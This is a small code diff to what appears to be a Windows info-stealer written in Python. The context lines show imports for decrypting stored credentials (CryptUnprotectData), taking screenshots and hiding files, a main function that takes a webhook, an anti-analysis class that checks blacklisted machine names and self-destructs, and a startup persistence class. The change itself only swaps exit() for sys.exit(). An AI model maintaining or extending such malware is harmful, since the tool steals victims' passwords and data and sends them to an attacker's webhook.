@@ -8,6 +8,7 @@ import re
 import shutil
 import sqlite3
 import subprocess
+import sys
 import uuid
 
 import psutil
@@ -19,6 +20,7 @@ from PIL import ImageGrab
 from win32api import SetFileAttributes
 from win32con import FILE_ATTRIBUTE_HIDDEN
 from win32crypt import CryptUnprotectData
+
 
 def main(webhook: str) -> None: 
     debug()
@@ -592,7 +594,7 @@ class debug:
         if hostname in self.blackListedPCNames: return True
     
     def self_destruct(self):
-        exit()
+        sys.exit()
 
 class startup():
     def __init__(self):
@@ -632,4 +634,4 @@ if __name__ == "__main__":
     # except Exception as e:
     #     print(e)
     #     try: cleanup()
-    #     except: exit() 
+    #     except: sys.exit() 
